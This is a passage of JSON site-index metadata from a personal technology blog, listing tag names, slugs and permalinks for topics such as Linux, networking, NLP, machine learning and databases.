gs/C/"},{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/tags/Notes/"},{"name":"k8s","slug":"k8s","permalink":"https://racleray.github.io/tags/k8s/"},{"name":"Rust","slug":"Rust","permalink":"https://racleray.github.io/tags/Rust/"},{"name":"Linux","slug":"Linux","permalink":"https://racleray.github.io/tags/Linux/"},{"name":"Network","slug":"Network","permalink":"https://racleray.github.io/tags/Network/"},{"name":"TCP","slug":"TCP","permalink":"https://racleray.github.io/tags/TCP/"},{"name":"terminal","slug":"terminal","permalink":"https://racleray.github.io/tags/terminal/"},{"name":"configure","slug":"configure","permalink":"https://racleray.github.io/tags/configure/"},{"name":"Memory Pool","slug":"Memory-Pool","permalink":"https://racleray.github.io/tags/Memory-Pool/"},{"name":"Memory","slug":"Memory","permalink":"https://racleray.github.io/tags/Memory/"},{"name":"NGINX","slug":"NGINX","permalink":"https://racleray.github.io/tags/NGINX/"},{"name":"Server Design","slug":"Server-Design","permalink":"https://racleray.github.io/tags/Server-Design/"},{"name":"Socket","slug":"Socket","permalink":"https://racleray.github.io/tags/Socket/"},{"name":"Poetry","slug":"Poetry","permalink":"https://racleray.github.io/tags/Poetry/"},{"name":"Multi-threading","slug":"Multi-threading","permalink":"https://racleray.github.io/tags/Multi-threading/"},{"name":"Coroutine","slug":"Coroutine","permalink":"https://racleray.github.io/tags/Coroutine/"},{"name":"HTTP","slug":"HTTP","permalink":"https://racleray.github.io/tags/HTTP/"},{"name":"Web","slug":"Web","permalink":"https://racleray.github.io/tags/Web/"},{"name":"Data Structure","slug":"Data-Structure","permalink":"https://racleray.github.io/tags/Data-Structure/"},{"name":"DataBase","slug":"DataBase","permalink":"https://racleray.github.io/tags/DataBase/"},{"name":"CUDA","slug":"CUDA","permalink":"https://racleray.github.io/tags/CUDA/"},{"name":"System Design","slug":"System-Design","permalink":"https://racleray.github.io/tags/System-Design/"},{"name":"RPC","slug":"RPC","permalink":"https://racleray.github.io/tags/RPC/"},{"name":"memory manage","slug":"memory-manage","permalink":"https://racleray.github.io/tags/memory-manage/"},{"name":"Template","slug":"Template","permalink":"https://racleray.github.io/tags/Template/"},{"name":"C","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"CMake","slug":"CMake","permalink":"https://racleray.github.io/tags/CMake/"},{"name":"Compiler","slug":"Compiler","permalink":"https://racleray.github.io/tags/Compiler/"},{"name":"Unix","slug":"Unix","permalink":"https://racleray.github.io/tags/Unix/"},{"name":"Shell","slug":"Shell","permalink":"https://racleray.github.io/tags/Shell/"},{"name":"Distributed System","slug":"Distributed-System","permalink":"https://racleray.github.io/tags/Distributed-System/"},{"name":"CAP","slug":"CAP","permalink":"https://racleray.github.io/tags/CAP/"},{"name":"Nginx","slug":"Nginx","permalink":"https://racleray.github.io/tags/Nginx/"},{"name":"Linux Kernel","slug":"Linux-Kernel","permalink":"https://racleray.github.io/tags/Linux-Kernel/"},{"name":"C-sharp","slug":"C-sharp","permalink":"https://racleray.github.io/tags/C-sharp/"},{"name":"hack","slug":"hack","permalink":"https://racleray.github.io/tags/hack/"},{"name":"kali","slug":"kali","permalink":"https://racleray.github.io/tags/kali/"},{"name":"Python","slug":"Python","permalink":"https://racleray.github.io/tags/Python/"},{"name":"Optimize","slug":"Optimize","permalink":"https://racleray.github.io/tags/Optimize/"},{"name":"String","slug":"String","permalink":"https://racleray.github.io/tags/String/"},{"name":"Book","slug":"Book","permalink":"https://racleray.github.io/tags/Book/"},{"name":"STL","slug":"STL","permalink":"https://racleray.github.io/tags/STL/"},{"name":"optimizer","slug":"optimizer","permalink":"https://racleray.github.io/tags/optimizer/"},{"name":"lookahead","slug":"lookahead","permalink":"https://racleray.github.io/tags/lookahead/"},{"name":"Database","slug":"Database","permalink":"https://racleray.github.io/tags/Database/"},{"name":"MySQL","slug":"MySQL","permalink":"https://racleray.github.io/tags/MySQL/"},{"name":"nlp","slug":"nlp","permalink":"https://racleray.github.io/tags/nlp/"},{"name":"prompt","slug":"prompt","permalink":"https://racleray.github.io/tags/prompt/"},{"name":"adaptor","slug":"adaptor","permalink":"https://racleray.github.io/tags/adaptor/"},{"name":"epoll","slug":"epoll","permalink":"https://racleray.github.io/tags/epoll/"},{"name":"æµ‹è¯•æ¡†æ¶","slug":"æµ‹è¯•æ¡†æ¶","permalink":"https://racleray.github.io/tags/%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/"},{"name":"deep learning","slug":"deep-learning","permalink":"https://racleray.github.io/tags/deep-learning/"},{"name":"contrastive learning","slug":"contrastive-learning","permalink":"https://racleray.github.io/tags/contrastive-learning/"},{"name":"cs basic","slug":"cs-basic","permalink":"https://racleray.github.io/tags/cs-basic/"},{"name":"design patterns","slug":"design-patterns","permalink":"https://racleray.github.io/tags/design-patterns/"},{"name":"data structure","slug":"data-structure","permalink":"https://racleray.github.io/tags/data-structure/"},{"name":"math","slug":"math","permalink":"https://racleray.github.io/tags/math/"},{"name":"searching","slug":"searching","permalink":"https://racleray.github.io/tags/searching/"},{"name":"BERT","slug":"BERT","permalink":"https://racleray.github.io/tags/BERT/"},{"name":"topic model","slug":"topic-model","permalink":"https://racleray.github.io/tags/topic-model/"},{"name":"BP","slug":"BP","permalink":"https://racleray.github.io/tags/BP/"},{"name":"sentence embedding","slug":"sentence-embedding","permalink":"https://racleray.github.io/tags/sentence-embedding/"},{"name":"SimCSE","slug":"SimCSE","permalink":"https://racleray.github.io/tags/SimCSE/"},{"name":"initialization","slug":"initialization","permalink":"https://racleray.github.io/tags/initialization/"},{"name":"knowledge distillation","slug":"knowledge-distillation","permalink":"https://racleray.github.io/tags/knowledge-distillation/"},{"name":"CRD","slug":"CRD","permalink":"https://racleray.github.io/tags/CRD/"},{"name":"SRRD","slug":"SRRD","permalink":"https://racleray.github.io/tags/SRRD/"},{"name":"NCE","slug":"NCE","permalink":"https://racleray.github.io/tags/NCE/"},{"name":"language model","slug":"language-model","permalink":"https://racleray.github.io/tags/language-model/"},{"name":"data augmentation","slug":"data-augmentation","permalink":"https://racleray.github.io/tags/data-augmentation/"},{"name":"self-supervise","slug":"self-supervise","permalink":"https://racleray.github.io/tags/self-supervise/"},{"name":"relation extraction","slug":"relation-extraction","permalink":"https://racleray.github.io/tags/relation-extraction/"},{"name":"tools","slug":"tools","permalink":"https://racleray.github.io/tags/tools/"},{"name":"jupyter","slug":"jupyter","permalink":"https://racleray.github.io/tags/jupyter/"},{"name":"pointer net","slug":"pointer-net","permalink":"https://racleray.github.io/tags/pointer-net/"},{"name":"NER","slug":"NER","permalink":"https://racleray.github.io/tags/NER/"},{"name":"FLAT","slug":"FLAT","permalink":"https://racleray.github.io/tags/FLAT/"},{"name":"methodology","slug":"methodology","permalink":"https://racleray.github.io/tags/methodology/"},{"name":"algorithm","slug":"algorithm","permalink":"https://racleray.github.io/tags/algorithm/"},{"name":"kmp","slug":"kmp","permalink":"https://racleray.github.io/tags/kmp/"},{"name":"trie","slug":"trie","permalink":"https://racleray.github.io/tags/trie/"},{"name":"Aho-Corasick","slug":"Aho-Corasick","permalink":"https://racleray.github.io/tags/Aho-Corasick/"},{"name":"ray","slug":"ray","permalink":"https://racleray.github.io/tags/ray/"},{"name":"distributed","slug":"distributed","permalink":"https://racleray.github.io/tags/distributed/"},{"name":"asyc","slug":"asyc","permalink":"https://racleray.github.io/tags/asyc/"},{"name":"python","slug":"python","permalink":"https://racleray.github.io/tags/python/"},{"name":"tool","slug":"tool","permalink":"https://racleray.github.io/tags/tool/"},{"name":"TransE","slug":"TransE","permalink":"https://racleray.github.io/tags/TransE/"},{"name":"Knowledge Graph","slug":"Knowledge-Graph","permalink":"https://racleray.github.io/tags/Knowledge-Graph/"},{"name":"sampling","slug":"sampling","permalink":"https://racleray.github.io/tags/sampling/"},{"name":"machine learning","slug":"machine-learning","permalink":"https://racleray.github.io/tags/machine-learning/"},{"name":"CRF","slug":"CRF","permalink":"https://racleray.github.io/tags/CRF/"},{"name":"spark","slug":"spark","permalink":"https://racleray.github.io/tags/spark/"},{"name":"normalization","slug":"normalization","permalink":"https://racleray.github.io/tags/normalization/"},{"name":"gan","slug":"gan","permalink":"https://racleray.github.io/tags/gan/"},{"name":"c++","slug":"c","permalink":"https://racleray.github.io/tags/c/"},{"name":"library","slug":"library","permalink":"https://racleray.github.io/tags/library/"},{"name":"capsule","slug":"capsule","permalink":"https://racleray.github.io/tags/capsule/"},{"name":"git","slug":"git","permalink":"https://racleray.github.io/tags/git/"},{"name":"text similarity","slug":"text-similarity","permalink":"https://racleray.github.io/tags/text-similarity/"},{"name":"DSSM","slug":"DSSM","permalink":"https://racleray.github.io/tags/DSSM/"},{"name":"CDSSM","slug":"CDSSM","permalink":"https://racleray.github.io/tags/CDSSM/"},{"name":"word2vec","slug":"word2vec","permalink":"https://racleray.github.io/tags/word2vec/"},{"name":"doc2vec","slug":"doc2vec","permalink":"https://racleray.github.io/tags/doc2vec/"},{"name":"SimHash","slug":"SimHash","permalink":"https://racleray.github.io/tags/SimHash/"},{"name":"visual text","slug":"visual-text","permalink":"https://racleray.github.io/tags/visual-text/"},{"name":"rasa","slug":"rasa","permalink":"https://racleray.github.io/tags/rasa/"},{"name":"retireval","slug":"retireval","permalink":"https://racleray.github.io/tags/retireval/"},{"name":"transformer","slug":"transformer","permalink":"https://racleray.github.io/tags/transformer/"},{"name":"cnn","slug":"cnn","permalink":"https://racleray.github.io/tags/cnn/"},{"name":"Fairseq","slug":"Fairseq","permalink":"https://racleray.github.io/tags/Fairseq/"},{"name":"seq2seq","slug":"seq2seq","permalink":"https://racleray.github.io/tags/seq2seq/"},{"name":"bleu","slug":"bleu","permalink":"https://racleray.github.io/tags/bleu/"},{"name":"rouge","slug":"rouge","permalink":"https://racleray.github.io/tags/rouge/"},{"name":"evaluation","slug":"evaluation","permalink":"https://racleray.github.io/tags/evaluation/"},{"name":"attention","slug":"attention","permalink":"https://racleray.github.io/tags/attention/"},{"name":"lda","slug":"lda","permalink":"https://racleray.github.io/tags/lda/"},{"name":"fine-grained","slug":"fine-grained","permalink":"https://racleray.github.io/tags/fine-grained/"},{"name":"classification","slug":"classification","permalink":"https://racleray.github.io/tags/classification/"},{"name":"fastText","slug":"fastText","permalink":"https://racleray.github.io/tags/fastText/"},{"name":"CNN","slug":"CNN","permalink":"https://racleray.github.io/tags/CNN/"},{"name":"RNN","slug":"RNN","permalink":"https://racleray.github.io/tags/RNN/"},{"name":"representation","slug":"representation","permalink":"https://racleray.github.io/tags/representation/"},{"name":"pretrained LM","slug":"pretrained-LM","permalink":"https://racleray.github.io/tags/pretrained-LM/"},{"name":"XLNet","slug":"XLNet","permalink":"https://racleray.github.io/tags/XLNet/"},{"name":"smoothing","slug":"smoothing","permalink":"https://racleray.github.io/tags/smoothing/"},{"name":"KenLM","slug":"KenLM","permalink":"https://racleray.github.io/tags/KenLM/"},{"name":"Docker","slug":"Docker","permalink":"https://racleray.github.io/tags/Docker/"},{"name":"NVIDIA Container Toolkit","slug":"NVIDIA-Container-Toolkit","permalink":"https://racleray.github.io/tags/NVIDIA-Container-Toolkit/"},{"name":"chinese process","slug":"chinese-process","permalink":"https://racleray.github.io/tags/chinese-process/"},{"name":"basic","slug":"basic","permalink":"https://racleray.github.io/tags/basic/"},{"name":"english process","slug":"english-process","permalink":"https://racleray.github.io/tags/english-process/"},{"name":"nltk","slug":"nltk","permalink":"https://racleray.github.io/tags/nltk/"},{"name":"regex","slug":"regex","permalink":"https://racleray.github.io/tags/regex/"}]}